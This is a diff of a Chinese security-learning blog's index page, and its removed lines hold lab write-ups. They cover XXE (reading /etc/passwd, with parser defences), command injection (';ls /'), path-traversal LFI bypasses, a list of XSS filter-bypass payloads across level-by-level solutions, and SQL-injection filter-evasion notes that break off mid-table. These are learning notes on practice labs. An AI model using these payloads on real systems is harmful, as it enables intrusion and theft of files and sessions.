-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;foo xmlns:xi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XInclude&quot;&gt;</span><br><span class="line">&lt;xi:include parse&#x3D;&quot;text&quot; href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&#x2F;&gt;&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="文件上传型"><a href="#文件上传型" class="headerlink" title="文件上传型"></a>文件上传型</h5><p>一些常见的文件包含 XML 内容：<code>.docx</code>, <code>.xlsx</code>, <code>.svg</code>, ……</p>
-<ul>
-<li>在线查看 <strong>Microsoft Office 全家桶</strong>文档文件时，可以在其 XML 中植入 XXE 代码.</li>
-<li>一些图片处理应用可以接收 <code>.svg</code> (矢量图片)，可以在其中插入恶意代码. <strong>注意</strong>，哪怕应用不显式地接收 <code>.svg</code> 类型，但是其实现的处理库还是可能支持，可以尝试强制提交查看反应.</li>
-</ul>
-<h5 id="修改提交的-Content-Type"><a href="#修改提交的-Content-Type" class="headerlink" title="修改提交的 Content-Type"></a>修改提交的 Content-Type</h5><p>一般的 POST 请求使用的默认类型由 HTML 表单生成，比如 <code>application/x-www-form-urlencoded</code>. 有的网页对接收的类型要求不严格，允许用户提交其他类型的数据，包括 XML.</p>
-<p>假如一个正常的 POST 请求如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;action HTTP&#x2F;1.0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line">foo&#x3D;bar</span><br></pre></td></tr></table></figure>
-
-<p>尝试修改为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;action HTTP&#x2F;1.0</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 52</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如果服务端接受修改后的请求，那么这就是一个可能的注入点。</p>
-<h3 id="XXE-labs"><a href="#XXE-labs" class="headerlink" title="XXE-labs"></a>XXE-labs</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>登录抓包发现数据使用xml格式进行传输，尝试构造DTD：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>发现成功返回，说明存在xxe漏洞。</p>
-<p>防御方法:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure>
-
-<p>ps.现在 <code>libxml</code> 默认关闭外部实体.</p>
-<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><p>payload同理，但是环境好像有点问题，提示list index out of range,……</p>
-<p>防御方法：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>
-
-<h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><p>payload同理。防御方法：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">factory.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>,<span class="keyword">true</span>);</span><br><span class="line">factory.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>,<span class="keyword">false</span>)</span><br><span class="line">factory.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
-
+          <p>今天学习一下xxe相关的内容。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/08/28/xxe%E9%97%AE%E9%A2%98/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -948,7 +582,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-08-28 10:46:58 / Modified: 11:02:33" itemprop="dateCreated datePublished" datetime="2020-08-28T10:46:58+08:00">2020-08-28</time>
+              <time title="Created: 2020-08-28 10:46:58 / Modified: 13:43:55" itemprop="dateCreated datePublished" datetime="2020-08-28T10:46:58+08:00">2020-08-28</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -976,127 +610,14 @@
 
       
           <p>去爬山了…昨天的内容没搞，今天补上emm</p>
-<h3 id="0x01-命令注入"><a href="#0x01-命令注入" class="headerlink" title="0x01 命令注入"></a>0x01 命令注入</h3><p>命令注入这六个题相对来说挺简单的，一个一个来看</p>
-<h5 id="CMD-1"><a href="#CMD-1" class="headerlink" title="CMD-1"></a>CMD-1</h5><p>没有任何过滤，直接<code>?cmd=ls</code>即可。</p>
-<h5 id="CMD-2"><a href="#CMD-2" class="headerlink" title="CMD-2"></a>CMD-2</h5><p>跟CMD-1一样，只不过变成了post，同理POST: cmd=ls。</p>
-<h5 id="CMD-3"><a href="#CMD-3" class="headerlink" title="CMD-3"></a>CMD-3</h5><p>GET型，直接<code>;ls /</code>即可(linux命令以分号结束)。</p>
-<h5 id="CMD-4"><a href="#CMD-4" class="headerlink" title="CMD-4"></a>CMD-4</h5><p>同CMD-3，只不过换成了POST型。</p>
-<h5 id="CMD-5"><a href="#CMD-5" class="headerlink" title="CMD-5"></a>CMD-5</h5><p>随意输入baidu.com提交后，发现url处变成了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?domain&#x3D;baidu.com&amp;server&#x3D;whois.publicinterestregistry.net</span><br></pre></td></tr></table></figure>
-
-<p>查看源码发现domain小写化后进行正则过滤，好像是要符合域名规范，不过好像<code>;ls /</code>直接就绕过了..不需要在server处注入。</p>
-<h5 id="CMD-6"><a href="#CMD-6" class="headerlink" title="CMD-6"></a>CMD-6</h5><p>同CMD-5，只不过变成了POST。</p>
-<h3 id="0x02-LFI-本地文件读取"><a href="#0x02-LFI-本地文件读取" class="headerlink" title="0x02 LFI(本地文件读取)"></a>0x02 LFI(本地文件读取)</h3><h5 id="LFI-1"><a href="#LFI-1" class="headerlink" title="LFI-1"></a>LFI-1</h5><p>直接任意文件读取,payload:<code>/etc/passwd</code></p>
-<h5 id="LFI-2"><a href="#LFI-2" class="headerlink" title="LFI-2"></a>LFI-2</h5><p>%00截断，payload:<code>?library=../../../flag%00</code></p>
-<h5 id="LFI-3"><a href="#LFI-3" class="headerlink" title="LFI-3"></a>LFI-3</h5><p>查看源码发现代码会检查最后四位是否是’.php’，这里绕过方法有很多：</p>
-<p>1.加点<code>.</code>（win）</p>
-<p>2.追加<code>/.</code>（win）</p>
-<p>3.追加不可见字符，例如%00</p>
-<p>4.大小写绕过（win）</p>
-<p>5.<code>::$DATA</code>（win）</p>
-<p>6.其他可解析后缀，例如php3,php4,php5,phtml等</p>
-<h5 id="LFI-4"><a href="#LFI-4" class="headerlink" title="LFI-4"></a>LFI-4</h5><p>查看源码发现重要的一行：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;includes/class_&#x27;</span>.addslashes($_GET[<span class="string">&#x27;class&#x27;</span>]).<span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>这里可以跟LFI-2思路一样，不过不能使用%00截断，因为addslashes函数会对单引号，双引号，反斜杠，0x00进行转义，造成%00截断失效。</p>
-<p>这里吧<code>class_</code>当成一个目录即可，用<code>../</code>跳出去。payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?class&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
-
-<h5 id="LFI-5"><a href="#LFI-5" class="headerlink" title="LFI-5"></a>LFI-5</h5><p>查看源码发现过滤了<code>../</code>，但是只是替换成空字符，且只替换一次，故通过双写<code>../</code>即可绕过。payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
-
-<h5 id="LFI-6-7-8-9-10"><a href="#LFI-6-7-8-9-10" class="headerlink" title="LFI-6/7/8/9/10"></a>LFI-6/7/8/9/10</h5><p>只是换成了post型，跟LFI-1/2/3/4/5相同。</p>
-<h5 id="LFI-11"><a href="#LFI-11" class="headerlink" title="LFI-11"></a>LFI-11</h5><p>查看源码发现需要post提交一个stylepath参数，但是文本框提交的不是，所以需要自己来，故通过firefox的hackbar插件完成post提交，payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stylepath&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
-
-<h5 id="LFI-12"><a href="#LFI-12" class="headerlink" title="LFI-12"></a>LFI-12</h5><p>跟上一题一样，只不过换成了get方式</p>
-<h5 id="LFI-13"><a href="#LFI-13" class="headerlink" title="LFI-13"></a>LFI-13</h5><p>和LFI-5一样(懵，为什么一样)</p>
-<h5 id="LFI-14"><a href="#LFI-14" class="headerlink" title="LFI-14"></a>LFI-14</h5><p>和LFI-5一样，换成POST请求</p>
-<h5 id="LFI-15"><a href="#LFI-15" class="headerlink" title="LFI-15"></a>LFI-15</h5><p>查看源码发现需要传入cookie，最终include的是cookie中TEMPLATE的值，故传入即可。payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x03-XSS"><a href="#0x03-XSS" class="headerlink" title="0x03 XSS"></a>0x03 XSS</h3><blockquote>
-<p>xss(跨站脚本攻击)是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</p>
-<p>xss攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。                                                                   –来自维基百科</p>
-</blockquote>
-<p>一般会遇到的过滤函数：</p>
-<ol>
-<li><code>htmlspecialchars()</code>: 函数把预定义的字符转换为 HTML 实体<ul>
-<li>范围: <code>&lt;&gt; &amp; &quot;</code>.</li>
-<li><code>&#39;</code> 默认配置不被过滤.</li>
-</ul>
-</li>
-<li><code>str_replace()</code>: 替换函数，注意它只替换<strong>一轮</strong>，并且<strong>区分大小写</strong>. 当被替换的目标串为空，可以考虑<strong>双写</strong>饶过.</li>
-<li><code>strtolower()</code> 函数将字符串转化为小写，防止大小写绕过.</li>
-<li><code>strpos()</code> 函数查找字符串在另一字符串中第一次出现的位置，并且<strong>对大小写敏感</strong>.</li>
-<li><code>angularjs</code> 中的 <code>ng-include</code>, 相当于 PHP 中 <code>include</code> 函数，能够包含其他文件.</li>
-</ol>
-<p>积累一些基本的xss的payload：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">&lt;scRIpT&gt;<span class="keyword">new</span> <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">confirm</span>`4`</span>&#123;&#125;&lt;<span class="regexp">/SCripT&gt; /</span><span class="regexp">/绕过script大小写，括号，alert等函数</span></span><br><span class="line"><span class="regexp">&lt;script&gt;(((confirm)))`666`&lt;/</span>script&gt; <span class="comment">// 绕过括号，alert等函数限制</span></span><br><span class="line">&lt;script&gt;co\u006efirm(<span class="number">666</span>)&lt;/script&gt;</span><br><span class="line">&lt;svg/onload=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;script&gt;&#123;confirm<span class="string">`NB`</span>&#125;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert<span class="string">`111`</span>&lt;/script&gt;</span><br><span class="line">%<span class="number">3</span>c/title%<span class="number">3</span>e%<span class="number">3</span>cscript%<span class="number">3</span>ealert<span class="string">`%22xss%22`</span>%<span class="number">3</span>c/script%<span class="number">3</span>e</span><br></pre></td></tr></table></figure>
-
-<h5 id="Level-1"><a href="#Level-1" class="headerlink" title="Level-1"></a>Level-1</h5><p>使用最基本的payload：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="Level-2"><a href="#Level-2" class="headerlink" title="Level-2"></a>Level-2</h5><p>查看源码发现htmlspecialchars过滤了，不过这里可以通过<code>&lt;input&gt;</code>标签处的闭合来进行代码注入，payload：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=aaa<span class="string">&quot;&gt; &lt;script&gt;alert(/xss/);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>虽然多了个<code>&quot;&gt;</code>，但也还是能执行。</p>
-<h5 id="Level-3"><a href="#Level-3" class="headerlink" title="Level-3"></a>Level-3</h5><p>跟上一题相比，value里面的str也被过滤了，标签无法使用，但是可以加监听事件来实现代码执行，payload：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; onclick=alert(/xss/) //</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="Level-4"><a href="#Level-4" class="headerlink" title="Level-4"></a>Level-4</h5><p>和上一题一样可以通过事件触发，payload：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onclick=alert(/xss/) &quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>(也可以大小写绕过)</p>
-<h5 id="Level-5"><a href="#Level-5" class="headerlink" title="Level-5"></a>Level-5</h5><p>查看源码发现<code>&lt;script&gt;</code>会被替换成<code>&lt;scr_ipt&gt;</code>,<code>on</code>会被替换成<code>o_n</code>，且无法绕过，不过发现a标签未被过滤，故通过a标签执行js代码。payload：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;a href=&quot;</span> javascript:alert(<span class="regexp">/xss/</span>)<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>(本题也可以大小写绕过)</p>
-<h5 id="Level-6"><a href="#Level-6" class="headerlink" title="Level-6"></a>Level-6</h5><p>本题大小写绕过即可。payload：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;sCript&gt;alert(/xss/);&lt;/Script&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="Level-7"><a href="#Level-7" class="headerlink" title="Level-7"></a>Level-7</h5><p>这次全部替换为小写，但是却是将敏感的keyword替换成空字符，故可通过双写绕过，payload：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;scscriptript&gt;alert(/xss/);&lt;/scrscriptipt&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="Level-8"><a href="#Level-8" class="headerlink" title="Level-8"></a>Level-8</h5><p>这次转化为小写后替换成无法执行的内容，且过滤了双引号。可以通过html实体编码绕过，payload：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br><span class="line"><span class="comment">//翻译过来就是：javascript:alert(1)</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="Level-9"><a href="#Level-9" class="headerlink" title="Level-9"></a>Level-9</h5><p>查看源码发现可以从友情链接处入手(未被过滤)。但是要求带<code>http://</code>协议头(位置无限制)。payload：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)// http://</span><br></pre></td></tr></table></figure>
-
-<h5 id="Level-10"><a href="#Level-10" class="headerlink" title="Level-10"></a>Level-10</h5><p>查看源码发现三个隐藏起来的input。发现t_sort可以利用，但是需要先将他调整为可见，才可以植入事件触发xss，payload：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa<span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span>alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>
-
-<h5 id="Level-11"><a href="#Level-11" class="headerlink" title="Level-11"></a>Level-11</h5><p>查看源码发现隐藏的四个input框有一个t_ref比较特殊，似乎value的内容刚好就是上一个页面的内容，尝试构造一个Referer试试：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: &quot;type=&quot;text&quot; onclick=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>
-
-<p>果然生效了。</p>
-<h5 id="Level-12"><a href="#Level-12" class="headerlink" title="Level-12"></a>Level-12</h5><p>跟11题一样，不过变成了User-Agent。</p>
-<h5 id="Level-13"><a href="#Level-13" class="headerlink" title="Level-13"></a>Level-13</h5><p>跟11题一样，不管换成了Cookie。</p>
-<h5 id="Level-14"><a href="#Level-14" class="headerlink" title="Level-14"></a>Level-14</h5><p>这个题是要借助上传图片xss来完成。访问<code>http://www.exifviewer.org</code>，然后长传一个带有xss代码的图片触发xss。将图片的标题主题标记备注作者版权等信息全部修改为如下payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">’ “&gt;&lt;img src&#x3D;xxx onerror&#x3D;alert(&#x2F;xss&#x2F;)’ 1.jpeg</span><br></pre></td></tr></table></figure>
-
-<p>上传后，则可触发xss。</p>
-<h5 id="Level-15"><a href="#Level-15" class="headerlink" title="Level-15"></a>Level-15</h5><p>这里用了 <code>angularjs</code> 的 <code>ng-include</code>, <code>ng-include</code> 指令用于包含外部的 HTML 文件。包含的内容将作为指定元素的子节点。<code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下，相当于 PHP 的 <code>include</code> 函数。</p>
-<p>本题payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;level15.php?src&#x3D;&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;</span><br></pre></td></tr></table></figure>
-
-<p>(具体原理还没理解透彻，angularjs还没学过…)</p>
-<h5 id="Level-16"><a href="#Level-16" class="headerlink" title="Level-16"></a>Level-16</h5><p>查看源码发现特殊符号和空格会被转义，<code>script</code> 会被替换成 <code> </code>，并且转换为小写。</p>
-<p>这里通过%0d %0a等分隔符绕过空格的过滤，同时使用img标签(不需要</img>)，payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword&#x3D;&lt;img%0Dsrc&#x3D;1%0Donerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="Level-17"><a href="#Level-17" class="headerlink" title="Level-17"></a>Level-17</h5><p>查看源码发现这一行：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">xsf01.swf?xxxxxxxxx</span>=<span class="string">sssss</span> <span class="attr">width</span>=<span class="string">100%</span> <span class="attr">heigth</span>=<span class="string">100%</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>成功后，<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">level18.php?arg01</span>=<span class="string">a&amp;arg02</span>=<span class="string">b</span>&gt;</span>点我进入下一关<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>相关php代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.htmlspecialchars($_GET[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.htmlspecialchars($_GET[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>使用onmouseover触发事件，payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01&#x3D;aaa&amp;arg02&#x3D; onmouseover&#x3D;alert(&#x2F;xss&#x2F;)</span><br></pre></td></tr></table></figure>
-
-<h5 id="Level-18-19-20"><a href="#Level-18-19-20" class="headerlink" title="Level-18/19/20"></a>Level-18/19/20</h5><p>Flash xss内容，暂时不考虑。</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/08/28/xss-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-lfi/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1140,7 +661,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-08-28 10:46:04 / Modified: 10:46:23" itemprop="dateCreated datePublished" datetime="2020-08-28T10:46:04+08:00">2020-08-28</time>
+              <time title="Created: 2020-08-28 10:46:04 / Modified: 13:43:13" itemprop="dateCreated datePublished" datetime="2020-08-28T10:46:04+08:00">2020-08-28</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1167,417 +688,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="2020-7-8-sql注入过滤问题"><a href="#2020-7-8-sql注入过滤问题" class="headerlink" title="2020-7-8-sql注入过滤问题"></a>2020-7-8-sql注入过滤问题</h2><p>今天总结一下sql注入过程中目前阶段碰到的主要过滤问题。</p>
-<h4 id="0x00-基本问题"><a href="#0x00-基本问题" class="headerlink" title="0x00 基本问题"></a>0x00 基本问题</h4><p>sql注入过程中，为了防止注入，代码中一般会进行输入字符的过滤或拦截。其中过滤指的是输入的内容被删除or替换成了别的字符，拦截指的是检测到指定内容存在后，直接返回错误，不再进行后续的操作。</p>
-<h4 id="0x01-and-or"><a href="#0x01-and-or" class="headerlink" title="0x01 and/or"></a>0x01 and/or</h4><p>1.尝试双写or大小写绕过</p>
-<p>2.运算符代替:<code>&amp;&amp;</code>,<code>||</code></p>
-<p>3.<code>^</code>运算符，例如:?id=1^(1=0) (1^0=1,故返回id=1的数据)</p>
-<p>4.拼接<code>=</code>运算符，例如:?id=1=(1=1) (1=1为真，故返回id=true即id=1的数据(true=1))</p>
-<h4 id="0x02-空格"><a href="#0x02-空格" class="headerlink" title="0x02 空格"></a>0x02 空格</h4><p>1.注释/**/代替</p>
-<p>2.<code>and/or</code>后面可以加偶数个<code>!或~</code>可以替代空格，也可以混合使用</p>
-<p>3.<code>%09, %0a, %0b, %0c, %0d, %a0</code>等部分不可见字符绕过</p>
-<p>4.巧用括号</p>
-<h4 id="0x03-括号"><a href="#0x03-括号" class="headerlink" title="0x03 括号"></a>0x03 括号</h4><p>使用order by进行盲注，例如：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,&#123;<span class="string">&#x27;1&#x27;</span>&#125; <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> <span class="keyword">limit</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
-
-<p>通过修改大括号中的值，即可进行指定字符串与目标未知字符串的比较，如果大于则位置字符串排在前，如果小于则指定字符串排在前。通过limit来控制显示问题。由此可通过编写脚本进行注入。</p>
-<h4 id="0x04-逗号"><a href="#0x04-逗号" class="headerlink" title="0x04 逗号"></a>0x04 逗号</h4><p>1.盲注</p>
-<p>2.使用join语句。例如：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
-
-<p>对于某些字符串处理函数，例如substr，可以通过substr(str from pos for len)的方法以避免使用括号，limit 0,1 可以通过limit 1 offset 1代替。</p>
-<h4 id="0x05-引号"><a href="#0x05-引号" class="headerlink" title="0x05 引号"></a>0x05 引号</h4><p>1.考虑宽字节注入(存在编码问题时)</p>
-<p>2.引号逃逸(当存在两个或以上数据输入时，通过\可以转义一个单引号，随后在下一个输入框or字段中写入注入代码，最后添加注释符，这时可巧妙的避开引号闭合问题)</p>
-<h4 id="0x06-注释"><a href="#0x06-注释" class="headerlink" title="0x06 注释"></a>0x06 注释</h4><p>1.巧妙闭合单引号，例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;&#39;$id&#39;;</span><br><span class="line">注入代码：?id&#x3D;1&#39; union select 1,2,&#39;3</span><br></pre></td></tr></table></figure>
-
-<h4 id="0x07-数字"><a href="#0x07-数字" class="headerlink" title="0x07 数字"></a>0x07 数字</h4><table>
-<thead>
-<tr>
-<th>代替字符</th>
-<th>数</th>
-<th>代替字符</th>
-<th>数</th>
-<th>代替字符</th>
-<th>数</th>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>false、!pi()</td>
-<td>0</td>
-<td>ceil(pi()*pi())</td>
-<td>10</td>
-<td>A</td>
-<td>ceil((pi()+pi())*pi())</td>
-<td>20</td>
-<td>K</td>
-</tr>
-<tr>
-<td>true、!(!pi())</td>
-<td>1</td>
-<td>ceil(pi()*pi())+true</td>
-<td>11</td>
-<td>B</td>
-<td>ceil(ceil(pi())*version())</td>
